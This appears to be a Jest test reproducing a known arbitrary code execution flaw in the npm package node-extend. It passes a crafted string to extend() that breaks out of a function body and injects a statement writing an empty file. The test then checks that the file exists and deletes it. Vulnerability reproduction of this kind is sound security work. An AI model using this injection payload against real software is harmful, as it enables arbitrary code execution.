//https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-571491
test("Arbitrary code execution in node-extend", () => {
  const fs = require("fs");
  const extend = require("node-extend");
  const path = "./node-extend";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    foo = extend(
      "function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}",
      ""
    );
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
